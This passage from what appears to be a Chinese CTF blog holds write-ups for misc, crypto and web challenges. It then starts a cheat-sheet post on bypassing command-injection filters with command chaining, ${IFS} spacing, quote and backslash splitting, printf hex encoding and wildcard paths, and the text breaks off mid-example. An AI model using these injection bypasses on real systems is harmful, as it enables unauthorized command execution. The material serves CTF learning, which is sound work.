loading="lazy"><br>14天啊，是挺无语的，当时想抓包改什么参数来着，全都失败。结果看了wp就是直接将没下载完的文件，放在winhex或010Editor里看。<br><img src="https://img-blog.csdnimg.cn/20200505160257998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>大写的服！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DASCTF&#123;welcome_to_DAS_Ap1r1&#125;</span><br></pre></td></tr></table></figure><h2 id="黄金六年"><a href="#黄金六年" class="headerlink" title="黄金六年"></a>黄金六年</h2><p><img src="https://img-blog.csdnimg.cn/20200505171323406.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>之前学长给我们看过这个，所以直接进PR里一帧一帧看了，在四本书上看到了二维码，手机扫不出来，当然不是全部，反正我的是扫不出来。<br>我用QR Research直接扫出来四个信息。<br><img src="https://img-blog.csdnimg.cn/20200505171655874.png" alt="Augenstern" loading="lazy"><br>交flag发现不对，有点奇怪，然后才发现学长给我们看这个题，没让我们看完，还有接下来的步骤。<br>将视频拖进010Editor中滑到最后，发现了base64编码<br><img src="https://img-blog.csdnimg.cn/20200505171906965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>进行解码，看到是rar压缩包，<br><img src="https://img-blog.csdnimg.cn/20200505171952931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后大佬们的办法是写脚本，我不会写，只能另外找办法。我就想到将base64编码转换成16进制，然后再保存为rar文件，好像可行。试一下。<br><img src="https://img-blog.csdnimg.cn/20200505172224958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>网站地址：<a href="https://the-x.cn/base64/">base64转换成16进制</a><br>然后，复制十六进制的编码粘贴到HxD中进行保存。<br><img src="https://img-blog.csdnimg.cn/20200505172418680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>保存后，打开看看，果然能打开，加密的，密码就是前面得到的那个字符串，解压得到flag<br><img src="https://img-blog.csdnimg.cn/20200505172624551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>提交正确。</p><h2 id="安洵杯-2019-吹着贝斯扫二维码"><a href="#安洵杯-2019-吹着贝斯扫二维码" class="headerlink" title="[安洵杯 2019]吹着贝斯扫二维码"></a>[安洵杯 2019]吹着贝斯扫二维码</h2><p><img src="https://img-blog.csdnimg.cn/20200505172943244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>解压发现一堆文件<br><img src="https://img-blog.csdnimg.cn/20200505174114206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>而且压缩包还是加密的，看看那些文件，发现都有JPEG，可能是jpg图片，先改一个看看。<br><img src="https://img-blog.csdnimg.cn/20200505174349348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>有点东西，总不能一个一个改吧？这么多，然后在百度的小角落里发现了一个工具——格式工厂(最喜欢工具了)<br><img src="https://img-blog.csdnimg.cn/20200505175208331.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>真快，看一下。<br><img src="https://img-blog.csdnimg.cn/20200505175414827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>好家伙，拼图。得到36张图，可以拼一张6x6的大图。<br>将文件夹拖进kali。然后使用工具拼图。<br>在文件夹内打开终端</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">montage</span> *<span class="selector-tag">jpg</span> <span class="selector-tag">-tile</span> 6<span class="selector-tag">x6</span> <span class="selector-tag">-geometry</span> 134<span class="selector-tag">x130</span>+0+0 <span class="selector-tag">out</span><span class="selector-class">.jpg</span></span><br></pre></td></tr></table></figure><p>然后得到一张混乱无序的图。<br><strong>注意这里的像素：要和分裂的二维码残片的像素一致才能得出这样的二维码乱序图。如果像素不一样了，就得不到这样的图，当然后面的步骤也就无法进行下去。</strong><br>而这张图的像素：打开一张二维码片段，然后看它的属性里面——详细信息<br><img src="https://img-blog.csdnimg.cn/20200505223036689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200505222625590.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>再使用gaps还原</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gaps --image=out.jpg --generations=40 --population=36 --size=100</span><br></pre></td></tr></table></figure><p>没还原出来，尴尬哈，，，，不知道怎么回事，我试了n次了，就是还原不出来。奇怪了。最后我实在是没办法了，只上手了。在PPT里拼的。md 累死，我拼了俩小时(泪流满面.gif)<br><img src="https://img-blog.csdnimg.cn/20200505234610382.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>扫描吧，终于可以扫了。<br><img src="https://img-blog.csdnimg.cn/20200505235154308.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>emmm，啥玩意儿。好像还有个flag.zip没看。<br><img src="https://img-blog.csdnimg.cn/20200505235349587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>嗷嗷，还有编码。复制出来解密。<br>上面扫出来的好像是加密顺序，因为题目中的二维码已经扫过了，还有贝斯。那应该是base编码。<br>这个编码好像是base32 编码，那就是解密过程，上面的是加密顺序，将它逆转一下。开始解码。<br>这题真的给我解吐了。转过来转过去。<br>得到压缩包密码，ThisIsSecret!233<br>解压flag.zip得到</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Qr_Is_MeAn1nGfuL&#125;</span><br></pre></td></tr></table></figure><p>这一道题真是耗费我好长时间。</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="传统知识-古典密码"><a href="#传统知识-古典密码" class="headerlink" title="传统知识+古典密码"></a>传统知识+古典密码</h2><p><img src="https://img-blog.csdnimg.cn/20200423214819610.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看着是年份，还是六十甲子年份。应该是要换成数字。于是百度对照表。把数字对照出来。而且背面还写了<code>+甲子</code>再加上60。一甲子是六十<br><img src="https://img-blog.csdnimg.cn/20200423215120794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>第一想法应该是ASCII码表。对照出来。<br><img src="https://img-blog.csdnimg.cn/20200423215257727.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后看着这一串字符，没了头绪。再看看题，没有提示了啊。然后发现一个重要的事，题目说传统密码加古典密码。我好像没用到古典密码啊。脑中快速过了一遍古典密码。这么短的字符串，应该会是凯撒密码，还有栅栏密码，其他的一下子没想太多。<br>八个字符，栅栏可以分两栏和四栏，试过之后是两栏的。<br><img src="https://img-blog.csdnimg.cn/20200423220621395.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后凯撒解密。<br>得到<br><img src="https://img-blog.csdnimg.cn/20200423220653926.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>至于是偏移5位，自己一个一个试出来的，就这个最靠谱。</p><h2 id="NPUCTF2020-这是什么觅🐎"><a href="#NPUCTF2020-这是什么觅🐎" class="headerlink" title="[NPUCTF2020]这是什么觅🐎"></a>[NPUCTF2020]这是什么觅🐎</h2><p>这个比赛我也看了，当时就看这一道题能看出来点门道，当然我一道题都没做出来，没什么可丢人的。就把这道题复现一下。也是成长过程。<br>下载得到一个文件，刚开始没有思路啊，没有想太多，不知道用什么方法打开，就直接payload++打开看了一眼，然后发现了<br><img src="https://img-blog.csdnimg.cn/20200425173827996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后，foremost分离文件，得到了压缩包。<br><img src="https://img-blog.csdnimg.cn/20200425173938202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这个我没想到有什么古典密码是这个的，然后看着右下角的纸条，这种有空隙的，是不是键盘密码之类的，再仔细想想不对，放弃，后来看着上面的日历，在这里面找，没啥头绪。再回头看那串字符串。发现第一个字母都是大些且<code>F、W、S、S、T、S、W、S</code>有个规律就是他们英文单词星期的首字母。这个一想就靠谱，就抓住这一点来想。后面跟数字，再看日历，第一排画圈了。没错的，就是这样，字母后面跟两个数字的都是在一周中又重复出现的。所以第一个字母是他们的顺序。第二个字母才是出题人想给的信息。这样看出来就是<br><code>3 1 12 5 14 4 1 18</code>，我不知道为什么把1算上了，不是已经划了吗？？<br>不过不纠结这个，我到这里卡住了。所以后面的看的师傅们的博客知道的。然后发现是字母表的，我之前一直在猜ascii码，就这个没想到。所以一道题没做出来。最后<code>flag&#123;calendar&#125;</code></p><h2 id="robomunication"><a href="#robomunication" class="headerlink" title="robomunication"></a>robomunication</h2><p><img src="https://img-blog.csdnimg.cn/20200505162039172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>听得出来是摩斯密码，别说了，都是辛酸，这个哔哔哔波，纯手工。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.... . .-.. .-.. --- .-- .... .- - .. ... - .... . -.- . -.-- .. - .. ... -... --- --- .--. -... . . .--.</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200505162022706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>再把这个字符串看一下，最后是flag是BOOPBEEP</p><h2 id="Unencode"><a href="#Unencode" class="headerlink" title="Unencode"></a>Unencode</h2><p><img src="https://img-blog.csdnimg.cn/20200505163409123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>什么提示都没有，，就一串编码，而且看着怎么也不想不起来什么密码是这样的，见识短浅了。<br>是UUencode编码<br>直接在线网站解就行了。<br><a href="http://ctf.ssleye.com/uu.html">UUencode在线解码</a><br>flag{dsdasdsa99877LLLKK}</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>web题先从简单的来，不然太容易被搞乱心态。</p><h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><p><img src="https://img-blog.csdnimg.cn/20200509202714432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">flag In the variable ! <span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag1.php&quot;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;args&#x27;</span>]))&#123;</span><br><span class="line">    $args = $_GET[<span class="string">&#x27;args&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/^\w+$/&quot;</span>,$args))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;args error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;var_dump($$args);&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先注意到的是正则表达式，关于正则表达式的学习，在学习PHP时了解过了，这个是要匹配正确的字符串。<br><code>\w</code> 匹配任意一个数字或字母或下划线<br>如果不匹配则直接die，匹配的话就输出一个可变变量，重点就在可变变量这里。我刚开始进行尝试，构造<code>?args=_lala_</code>结果输出了NULL，好像与eval函数有关，发现对eval函数了解的不够，就又查了一遍。<br><img src="https://img-blog.csdnimg.cn/2020050921085531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br><code>$$args</code>代表一个变量，所以这里传一个全局变量给它，全局变量有九种，可以挨个试，九大全局变量在百度直接搜索就可以搜到。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>|$_POST       [用于接收post提交的数据]</span><br><span class="line"><span class="number">2</span>|$_GET        [用于获取url地址栏的参数数据]</span><br><span class="line"><span class="number">3</span>|$_FILES      [用于文件就收的处理img 最常见]</span><br><span class="line"><span class="number">4</span>|$_COOKIE     [用于获取与setCookie()中的name 值]</span><br><span class="line"><span class="number">5</span>|$_SESSION    [用于存储session的值或获取session中的值]</span><br><span class="line"><span class="number">6</span>|$_REQUEST    [具有get,post的功能，但比较慢]</span><br><span class="line"><span class="number">7</span>|SERVER       [是预定义服务器变量的一种，所有SERVER[是预定义服务器变量的一种，所有_SERVER [是预定义服务器变量的一种，所有_SERVER开头的都</span><br><span class="line"><span class="number">8</span>|$GLOBALS     [一个包含了全部变量的全局组合数组]</span><br><span class="line"><span class="number">9</span>|$_ENV        [是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它]</span><br></pre></td></tr></table></figure><p>然后，用到了GLOBALS就得到了flag<br><img src="https://img-blog.csdnimg.cn/20200509212100179.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>f12发现了非常多的编码，查百度，发现是jother编码，而且控制台可解。直接复制所有编码粘贴到控制台，回车即可。flag大写。</p><h2 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h2><p>打开网页什么也没有，没有其他提示，回头看题目，“头”等舱。header。进行抓包尝试。成功找到flag<br><img src="https://img-blog.csdnimg.cn/20200509214229290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><h2 id="管理员系统"><a href="#管理员系统" class="headerlink" title="管理员系统"></a>管理员系统</h2><p>f12查看有无有用信息，找到一个base64编码(==)，解码得到test123，应该是密码了吧。<br>所以尝试登陆：发现登录失败，而且IP禁止访问，联系本地管理员。<br>所以可能是XFF。可以改一下，本地管理员那就改成本地的127.0.0.1<br>可以抓包添加，我直接使用chrome扩展插件添加了，然后刷新网页，得到flag。</p><p><img src="https://img-blog.csdnimg.cn/20200509215156264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行漏洞各种绕过方式</title>
      <link href="/2020/08/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F/"/>
      <url>/2020/08/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>刚做了一道题，是有关命令执行漏洞的，里面过滤的内容比较多，一时间找不到头绪，所以学习一下关于命令执行漏洞的绕过方式，以便以后遇到不会像现在这样一点思路都没有。<br>总结完再去做就很轻松了。</p><h1 id="命令执行漏洞绕过方式"><a href="#命令执行漏洞绕过方式" class="headerlink" title="命令执行漏洞绕过方式"></a>命令执行漏洞绕过方式</h1><h2 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h2><h3 id="windows中常见管道符"><a href="#windows中常见管道符" class="headerlink" title="windows中常见管道符"></a>windows中常见管道符</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|直接执行后面的语句</span><br><span class="line">||如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200710121417968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h3 id="linux中常见管道符"><a href="#linux中常见管道符" class="headerlink" title="linux中常见管道符"></a>linux中常见管道符</h3><p>以上四种管道符在linux系统中同样适用，增加一种</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;前面和后面命令都要执行，无论前面真假</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zxcv0221@kali:~/桌面$ ping -c 1 m0re;cat flag</span><br><span class="line">ping: m0re: 没有与主机名关联的地址</span><br><span class="line">you are good!</span><br></pre></td></tr></table></figure><h2 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h2><p>这个比较多了</p><p>1.<code>$&#123;IFS&#125;</code> </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zxcv0221@kali:~/桌面$ cat$&#123;IFS&#125;flag</span><br><span class="line">you are good!</span><br></pre></td></tr></table></figure><ol start="2"><li><p><code>$IFS$9</code> $9指传过来的第9个参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zxcv0221@kali:~/桌面$ cat$IFS$9flag</span><br><span class="line">you are good!</span><br><span class="line">zxcv0221@kali:~/桌面$ cat$IFS$1flag</span><br><span class="line">you are good!</span><br></pre></td></tr></table></figure></li><li><p><code>%09</code>(需要PHP环境，不演示)</p></li><li><p><code>&lt;</code>或者<code>&lt;&gt;</code>重定向</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zxcv0221@kali:~/桌面$ cat&lt;flag</span><br><span class="line">you are good!</span><br><span class="line">zxcv0221@kali:~/桌面$ cat&lt;&gt;flag</span><br><span class="line">you are good!</span><br></pre></td></tr></table></figure><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><p>比如：过滤了cat或者flag</p></li><li><p>变量拼接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zxcv0221@kali:~/桌面$ a=c;b=at;c=fl;d=ag;$a$b $c$d</span><br><span class="line">you are good!</span><br></pre></td></tr></table></figure></li><li><p>单引号，双引号绕过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zxcv0221@kali:~/桌面$ ca&#x27;&#x27;t flag</span><br><span class="line">you are good!</span><br><span class="line">zxcv0221@kali:~/桌面$ cat&quot;&quot; flag</span><br><span class="line">you are good!</span><br></pre></td></tr></table></figure></li><li><p>编码绕过</p></li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span>(printf <span class="string">&quot;\154\163&quot;</span>) ==&gt;<span class="built_in">ls</span></span><br><span class="line"><span class="variable">$</span>(printf <span class="string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>) ==&gt;<span class="built_in">cat</span> /flag</span><br><span class="line">&#123;printf,<span class="string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>&#125;|\<span class="variable">$0</span> ==&gt;<span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure><p>栗子：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zxcv0221@kali:~/桌面$ $(printf &quot;\154\163&quot;)</span><br><span class="line">firefox-esr.desktop  flag</span><br></pre></td></tr></table></figure><ol start="4"><li>读文件绕过(当cat被过滤)<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(1)more:一页一页的显示档案内容</span><br><span class="line">(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页</span><br><span class="line">(3)head:查看头几行</span><br><span class="line">(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">(5)tail:查看尾几行</span><br><span class="line">(6)nl：显示的时候，顺便输出行号</span><br><span class="line">(7)od:以二进制的方式读取档案内容</span><br><span class="line">(8)vi:一种编辑器，这个也可以查看</span><br><span class="line">(9)vim:一种编辑器，这个也可以查看</span><br><span class="line">(10)sort:可以查看</span><br><span class="line">(11)uniq:可以查看</span><br><span class="line">(12)file -f:报错出具体内容</span><br></pre></td></tr></table></figure>栗子：<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zxcv0221@kali:~/桌面$ more flag</span><br><span class="line">you are good!</span><br></pre></td></tr></table></figure></li><li>反斜线</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zxcv0221@kali:~/桌面$ c\at fl\ag</span><br><span class="line">you are good!</span><br></pre></td></tr></table></figure><ol start="6"><li><code>$1、$2等和$@</code><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zxcv0221@kali:~/桌面$ c$1at fl$@ag</span><br><span class="line">you are good!</span><br></pre></td></tr></table></figure><h2 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h2><code>?</code>代表一个字符<code>*</code>代表一串字符<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">zxcv0221@kali:~/桌面<span class="variable">$</span> /???/?[<span class="type">a</span>][<span class="type">t</span>] ?<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;&#x27;</span></span><br><span class="line">you are good!</span><br><span class="line">zxcv0221@kali:~/桌面<span class="variable">$</span> /???/?[<span class="type">a</span>][<span class="type">t</span>] ?<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;&#x27;</span>?<span 